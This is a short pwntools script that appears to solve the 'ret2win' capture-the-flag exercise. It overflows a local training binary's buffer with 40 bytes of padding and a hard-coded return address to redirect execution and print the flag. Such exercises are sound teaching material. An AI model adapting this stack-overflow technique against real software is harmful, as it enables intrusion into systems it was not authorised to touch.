from pwn import *

p = process('./ret2win')
print p.recvuntil("fgets!\n")
p.sendline("aaaa"*10 + "\x11\x08\x40\x00\x00\x00\x00\x00")
print p.recvuntil("}")
